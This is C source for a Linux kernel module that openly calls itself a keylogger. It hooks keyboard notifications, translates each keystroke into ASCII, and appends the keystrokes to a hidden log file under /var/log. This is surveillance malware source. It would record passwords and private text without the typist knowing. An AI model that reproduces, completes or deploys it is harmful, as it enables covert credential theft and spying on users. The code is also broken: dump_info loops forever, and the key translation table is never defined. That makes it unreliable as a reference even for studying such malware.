/* Necessary includes for device drivers */
#include "keylogger.h"
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h> /*needed because we will be fucx-ing with the proc fs*/
#include <asm/uaccess.h> /*contains copy_from_user and copy_to_user etc.*/
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
#include <linux/seq_file.h>

#define LOGSIZE   128
#define LOG_FILE "/var/log/keylogdata"

MODULE_LICENSE("Dual BSD/GPL");

/*Ales static :)*/
static struct file *logfile;
static char logbuf[LOGSIZE];
unsigned long logidx = 0;

/* Translates ascii keys */
static void tranlsate( struct keyboard_notifier_param *param) //, char *buf )
{
    unsigned char val = param->value & 0xff;
    unsigned long len;

    len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);

    logidx += len;
}

static int dump_info(int null)
{
    loff_t pos = 0;
    mm_segment_t old_fs;
    size_t ret = 0;

    while ( 1 )
    {
        if ( logfile )
        {
            old_fs = get_fs();
            set_fs(get_ds());

            ret = vfs_write(logfile, logbuf, logidx, &pos);

            set_fs(old_fs);
        }

        logidx = 0;
    }

    return 0;
}

int keypress_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;

	int ret = NOTIFY_OK;

	if(code == KBD_KEYCODE){
		tranlsate(param); //, (char*)param->down);
		//printk(KERN_DEBUG "Keylogger %i %s\n",c2k[param->value],(param->down?"down":"up"));
	}
	if(logidx == LOGSIZE - 1){
		dump_info(0);
		logidx = 0;
	}

	return ret;
}

static struct notifier_block nb = {.notifier_call = keypress_notify};

static int keylogger_init(void)
{
	printk(KERN_INFO "Installing keylogger\n");
	register_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger installed!\n");

	logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
    
    if ( ! logfile ) printk(KERN_DEBUG "KEYLOGGER: Failed to open log file: %s", LOG_FILE);
	
	return 0;
}

static void keylogger_release(void)
{
    if ( logfile ) filp_close(logfile, NULL);

	printk(KERN_INFO "Removing keylogger...\n");	
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger removed!\n");
}

module_init(keylogger_init);
module_exit(keylogger_release);
